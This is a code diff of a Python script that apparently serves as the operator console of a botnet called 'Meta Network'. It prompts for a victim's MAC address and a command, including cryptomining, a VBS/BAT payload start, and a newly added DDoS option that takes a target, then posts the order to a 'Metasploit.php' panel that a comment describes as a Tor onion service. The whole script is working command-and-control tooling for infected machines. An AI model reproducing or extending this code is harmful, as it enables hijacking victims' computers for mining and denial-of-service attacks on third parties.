@@ -1,46 +1,50 @@
 import requests
 import time
-import subprocess
-import uuid
-import socket
-import zlib
-import base64
-import struct
-import random
-import threading
 import os
-import sys
 
+
+
+# Clear screen and display banner
 os.system("clear")
 os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Meta | lolcat")
 os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Network | lolcat")
 
-local_port_file = "LPort.io"
-if os.path.exists(local_port_file):
-    # If it exists, read the local port from it
-    with open(local_port_file, "r") as file:
-        PORT = file.read().strip()
+
 
 file_to_delete = "Meta.io" 
 
 if os.path.exists(file_to_delete):
     os.remove(file_to_delete)
 
+
 while True:
     mac = input("Enter Mac: ")
-    option = input("(START/STOP/START-VBSBAT/MINING) : ")
+    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS) : ")
 
-    url = 'http://127.0.0.1:{PORT}/Metasploit.php'
-    data = {'MAC': mac, 'Option': option}
-    response = requests.post(url, data=data)
-
-    if response.status_code == 200:
-        print("Data sent successfully.")
+    if option == "DDOS":
+        target = input("Target >>> : ")
     else:
-        print("Failed to send data.")
-        time.sleep(10)
+        target = ""
 
+    # Define the Tor onion service URL
+    tor_url = 'http://127.0.0.1:80/Metasploit.php'
+    if option == "DDOS":
+     data = {'MAC': mac, 'Option': option,'Target': target}
+    else:
+     data = {'MAC': mac, 'Option': option}
+    try:
+        response = requests.post(tor_url, data=data)
+        if response.status_code == 200:
+            print("Data sent successfully.")
+        else:
+            print("Failed to send data.")
+            time.sleep(5)
+    except Exception as e:
+        print(f"Error: {str(e)}")
+
+    time.sleep(10)
     file_to_delete = "Meta.io"  
 
     if os.path.exists(file_to_delete):
      os.remove(file_to_delete)
+
